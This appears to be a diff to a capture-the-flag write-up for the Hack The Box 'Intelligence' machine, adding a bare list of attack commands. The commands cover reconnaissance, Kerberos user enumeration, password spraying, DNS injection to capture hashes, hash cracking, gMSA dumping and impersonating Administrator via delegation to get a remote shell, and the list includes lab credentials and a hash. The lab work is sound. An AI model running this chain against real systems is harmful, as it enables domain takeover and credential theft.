@@ -1,5 +1,51 @@
 ```
 nmap -sS -sC -sV -T5 -Pn 10.10.10.248
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.248/FUZZ -e .aspx,.php,.txt,.html,.sh
+wget http://10.10.10.248/documents/2020-01-01-upload.pdf
+exiftool 2020-01-01-upload.pdf
+curl http://10.10.10.248/documents/2020-01-01-upload.pdf --output 2020-01-01-upload.pdf
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+chmod +x kerbrute_linux_amd64
+./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users
+python3 findpdfs.py
+wget -i pdfsurl
+exiftool *upload.pdf | grep Creator | sort –u
+exiftool *upload.pdf | grep Creator | awk -F': ' '{print $2}' | sort -u
+for f in *pdf; do pdftotext $f; done
+head -n1 *txt
+NewIntelligenceCorpUser9876
+cat *txt > all.txt
+nano all.txt; ctrl+w password
+crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
+smbclient -L \\\\10.10.10.248\\ -U intelligence.htb/Tiffany.Molina
+smbclient \\\\10.10.10.248\\Users -U intelligence.htb/Tiffany.Molina
+smbclient \\\\10.10.10.248\\IT -U intelligence.htb/Tiffany.Molina
+https://github.com/dirkjanm/krbrelayx
+./dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.14.20 -t A
+responder -I tun0
+john hash -w=/usr/share/wordlists/rockyou.txt
+Ted.Graves | Mr.Teddy
+sudo apt install bloodhound
+neo4j console
+git clone https://github.com/fox-it/BloodHound.py.git
+cd BloodHound.py
+python3 setup.py install
+python3 bloodhound.py -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
+Mark User as owned; Shortest Paths to Domain Admins from Owned Principals
+git clone https://github.com/micahvandeusen/gMSADumper
+python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248
+echo "10.10.10.248 intelligence.htb" | sudo tee -a /etc/hosts
+sudo service virtualbox-guest-utils stop
+sudo apt install ntpdate
+sudo ntpdate -s 10.10.10.248
+./getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :51e4932f13712047027300f869d07ab6
+export KRB5CCNAME=Administrator.ccache
+./wmiexec.py -k -no-pass dc.intelligence.htb
+```
+
+
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.10.248
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/6413486e-f42a-43a5-b969-237d18b6e161)
 
